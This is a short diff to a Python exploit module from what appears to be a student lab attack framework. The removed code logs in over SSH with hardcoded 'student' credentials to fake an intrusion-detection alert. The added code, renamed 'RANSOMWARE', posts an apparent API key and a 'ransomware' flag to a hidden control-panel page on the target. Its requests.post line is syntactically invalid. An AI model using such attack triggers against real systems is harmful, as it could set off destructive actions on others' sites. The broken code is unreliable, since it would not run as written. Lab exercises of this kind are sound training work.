@@ -1,13 +1,13 @@
-import pwn, Util, random
+import pwn, Util, random,requests
 
 class exploit(object):
     def __init__(self):
-        self.Name = "HIDS_Mock2"
-        self.Description = "Fake the first nids alert"
+        self.Name = "RANSOMWARE"
+        self.Description = "the website RANSOMWARE"
         self.Author = "René van Vliet"
         self.Version = "0.1"
         self.POC = ""
-        self.Type = Util.Type.Remote
+        self.Type = Util.Type.Local
         self.Platform = Util.Platform.Linux
 
         self.HOST = None
@@ -15,9 +15,7 @@ class exploit(object):
 
 
     def exploit(self):
-        remote = pwn.ssh(host=self.HOST, user="student", password="student")
-        remote(f"/bin/echo {str(random.randint(1,100))} >> /test/Mock2.log")
-        remote.close()
+        requests.post(self.HOST+"/controlpanel_68696464656e.php", {"API","8a77463e-149e-4443-a7f7-9e40cb0f0e11","ransomware":"on"}
 
 
     def _validate(self):
